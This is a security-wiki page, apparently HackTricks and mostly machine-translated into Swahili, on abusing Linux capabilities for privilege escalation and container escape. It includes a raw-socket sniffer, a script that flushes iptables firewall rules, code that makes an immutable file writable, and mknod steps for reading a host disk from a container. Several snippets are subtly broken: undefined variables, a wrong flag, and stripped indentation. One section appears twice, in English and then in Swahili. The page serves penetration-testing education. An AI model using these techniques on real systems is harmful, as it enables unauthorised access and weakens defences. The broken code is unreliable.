​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **lengo la kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila taaluma.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Hii inamaanisha kwamba inawezekana kusikiliza kwenye bandari yoyote (hata zile za kibali).** Huwezi kupandisha mamlaka moja kwa moja kwa kutumia uwezo huu.

**Mfano na binary**

Ikiwa **`python`** ina uwezo huu itakuwa na uwezo wa kusikiliza kwenye bandari yoyote na hata kuungana kutoka kwake na bandari nyingine yoyote (huduma zingine zinahitaji muunganisho kutoka kwenye bandari za kibali maalum)

{% tabs %}
{% tab title="Listen" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Unganisha" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) uwezo unaruhusu michakato **kuunda RAW na PACKET sockets**, ikiwaruhusu kuzalisha na kutuma pakiti za mtandao zisizo na mpangilio. Hii inaweza kusababisha hatari za usalama katika mazingira ya kontena, kama vile kupotosha pakiti, kuingiza trafiki, na kupita udhibiti wa ufikiaji wa mtandao. Waigizaji wabaya wanaweza kutumia hii kuingilia kati mwelekeo wa kontena au kuhatarisha usalama wa mtandao wa mwenyeji, hasa bila ulinzi wa moto wa kutosha. Zaidi ya hayo, **CAP_NET_RAW** ni muhimu kwa kontena zenye mamlaka kusaidia operesheni kama ping kupitia maombi ya RAW ICMP.

**Hii inamaanisha kwamba inawezekana kunasa trafiki.** Huwezi kuongeza mamlaka moja kwa moja kwa uwezo huu.

**Mfano na binary**

Ikiwa binary **`tcpdump`** ina uwezo huu utaweza kuutumia kunasa taarifa za mtandao.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Kumbuka kwamba ikiwa **muktadha** unatoa uwezo huu unaweza pia kutumia **`tcpdump`** kunasa trafiki.

**Mfano na binary 2**

Mfano ufuatao ni **`python2`** msimbo ambao unaweza kuwa na manufaa kunasa trafiki ya kiolesura cha "**lo**" (**localhost**). Msimbo huu unatoka kwenye maabara "_Misingi: CAP-NET\_BIND + NET\_RAW_" kutoka [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) uwezo unampa mmiliki nguvu ya **kubadilisha mipangilio ya mtandao**, ikiwa ni pamoja na mipangilio ya firewall, meza za routing, ruhusa za socket, na mipangilio ya interface ya mtandao ndani ya majina ya mtandao yaliyofichuliwa. Pia inaruhusu kuwasha **modo wa promiscuous** kwenye interfaces za mtandao, ikiruhusu kunasa pakiti kupitia majina ya mtandao.

**Mfano na binary**

Hebu tuone kwamba **python binary** ina uwezo huu.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Hii inamaanisha kwamba inawezekana kubadilisha sifa za inode.** Huwezi kupandisha mamlaka moja kwa moja na uwezo huu.

**Mfano na binary**

Ikiwa unapata kwamba faili ni immutable na python ina uwezo huu, unaweza **kuondoa sifa ya immutable na kufanya faili iweze kubadilishwa:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Kumbuka kwamba kawaida sifa hii isiyoweza kubadilishwa huwekwa na kuondolewa kwa kutumia:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inaruhusu utekelezaji wa `chroot(2)` system call, ambayo inaweza kuruhusu kutoroka kutoka kwa mazingira ya `chroot(2)` kupitia udhaifu unaojulikana:

* [Jinsi ya kutoroka kutoka kwa suluhisho mbalimbali za chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) sio tu inaruhusu utekelezaji wa `reboot(2)` system call kwa ajili ya kuanzisha upya mfumo, ikiwa ni pamoja na amri maalum kama `LINUX_REBOOT_CMD_RESTART2` iliyoundwa kwa ajili ya majukwaa fulani ya vifaa, lakini pia inaruhusu matumizi ya `kexec_load(2)` na, kuanzia Linux 3.17, `kexec_file_load(2)` kwa ajili ya kupakia nyukta mpya au zilizotiwa saini.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ilitengwa kutoka kwa **CAP_SYS_ADMIN** katika Linux 2.6.37, ikitoa uwezo wa kutumia `syslog(2)` call. Uwezo huu unaruhusu kuona anwani za kernel kupitia `/proc` na interfaces zinazofanana wakati mipangilio ya `kptr_restrict` iko kwenye 1, ambayo inasimamia kufichuliwa kwa anwani za kernel. Kuanzia Linux 2.6.39, chaguo-msingi kwa `kptr_restrict` ni 0, ikimaanisha anwani za kernel zinakabiliwa, ingawa usambazaji wengi huweka hii kuwa 1 (ficha anwani isipokuwa kutoka uid 0) au 2 (daima ficha anwani) kwa sababu za usalama.

Zaidi ya hayo, **CAP_SYSLOG** inaruhusu kufikia matokeo ya `dmesg` wakati `dmesg_restrict` imewekwa kuwa 1. Licha ya mabadiliko haya, **CAP_SYS_ADMIN** inabaki na uwezo wa kufanya operesheni za `syslog` kutokana na mifano ya kihistoria.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inapanua kazi ya `mknod` system call zaidi ya kuunda faili za kawaida, FIFOs (mabomba yenye majina), au UNIX domain sockets. Inaruhusu hasa kuunda faili maalum, ambazo zinajumuisha:

- **S_IFCHR**: Faili maalum za wahusika, ambazo ni vifaa kama terminal.
- **S_IFBLK**: Faili maalum za block, ambazo ni vifaa kama diski.

Uwezo huu ni muhimu kwa michakato inayohitaji uwezo wa kuunda faili za vifaa, ikirahisisha mwingiliano wa moja kwa moja na vifaa kupitia vifaa vya wahusika au block.

Ni uwezo wa chombo cha docker wa chaguo-msingi ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Uwezo huu unaruhusu kufanya kupandisha hadhi (kupitia kusoma diski kamili) kwenye mwenyeji, chini ya hali hizi:

1. Kuwa na ufikiaji wa awali kwa mwenyeji (Bila Haki).
2. Kuwa na ufikiaji wa awali kwa chombo (Bila Haki (EUID 0), na `CAP_MKNOD` inayofaa).
3. Mwenyeji na chombo vinapaswa kushiriki jina moja la mtumiaji.

**Hatua za Kuunda na Kufikia Kifaa cha Block katika Chombo:**

1. **Kwenye Mwenyeji kama Mtumiaji wa Kawaida:**
- Tambua kitambulisho chako cha mtumiaji wa sasa kwa kutumia `id`, mfano, `uid=1000(standarduser)`.
- Tambua kifaa kinacholengwa, kwa mfano, `/dev/sdb`.

2. **Ndani ya Chombo kama `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Rudi kwenye Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
This approach allows the standard user to access and potentially read data from `/dev/sdb` through the container, exploiting shared user namespaces and permissions set on the device.

### CAP\_SETPCAP

**CAP_SETPCAP** enables a process to **alter the capability sets** of another process, allowing for the addition or removal of capabilities from the effective, inheritable, and permitted sets. However, a process can only modify capabilities that it possesses in its own permitted set, ensuring it cannot elevate another process's privileges beyond its own. Recent kernel updates have tightened these rules, restricting `CAP_SETPCAP` to only diminish the capabilities within its own or its descendants' permitted sets, aiming to mitigate security risks. Usage requires having `CAP_SETPCAP` in the effective set and the target capabilities in the permitted set, utilizing `capset()` for modifications. This summarizes the core function and limitations of `CAP_SETPCAP`, highlighting its role in privilege management and security enhancement.

**`CAP_SETPCAP`** ni uwezo wa Linux unaoruhusu mchakato **kubadilisha seti za uwezo za mchakato mwingine**. Inatoa uwezo wa kuongeza au kuondoa uwezo kutoka kwa seti za uwezo zinazofaa, zinazorithiwa, na zinazoruhusiwa za michakato mingine. Hata hivyo, kuna vizuizi fulani juu ya jinsi uwezo huu unaweza kutumika.

Mchakato wenye `CAP_SETPCAP` **unaweza tu kutoa au kuondoa uwezo ambao uko katika seti yake ya uwezo inayoruhusiwa**. Kwa maneno mengine, mchakato hauwezi kutoa uwezo kwa mchakato mwingine ikiwa haujakuwa na uwezo huo mwenyewe. Kizuizi hiki kinazuia mchakato kuinua mamlaka ya mchakato mwingine zaidi ya kiwango chake mwenyewe cha mamlaka.

Zaidi ya hayo, katika toleo za hivi karibuni za kernel, uwezo wa `CAP_SETPCAP` umekuwa **ukizuiwa zaidi**. Hauruhusu tena mchakato kubadilisha seti za uwezo za michakato mingine kwa njia isiyo ya kawaida. Badala yake, **inaruhusu tu mchakato kupunguza uwezo katika seti yake ya uwezo inayoruhusiwa au seti za uwezo zinazoruhusiwa za wazazi wake**. Mabadiliko haya yaliletwa ili kupunguza hatari za usalama zinazoweza kutokea zinazohusiana na uwezo huo.

Ili kutumia `CAP_SETPCAP` kwa ufanisi, unahitaji kuwa na uwezo huo katika seti yako ya uwezo inayofaa na uwezo wa lengo katika seti yako ya uwezo inayoruhusiwa. Unaweza kisha kutumia wito wa mfumo wa `capset()` kubadilisha seti za uwezo za michakato mingine.

Kwa muhtasari, `CAP_SETPCAP` inaruhusu mchakato kubadilisha seti za uwezo za michakato mingine, lakini haiwezi kutoa uwezo ambao haina mwenyewe. Zaidi ya hayo, kutokana na wasiwasi wa usalama, kazi yake imepunguzika katika toleo za hivi karibuni za kernel ili kuruhusu tu kupunguza uwezo katika seti yake ya uwezo inayoruhusiwa au seti za uwezo zinazoruhusiwa za wazazi wake.

## References

**Most of these examples were taken from some labs of** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), so if you want to practice this privesc techniques I recommend these labs.

**Other references**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
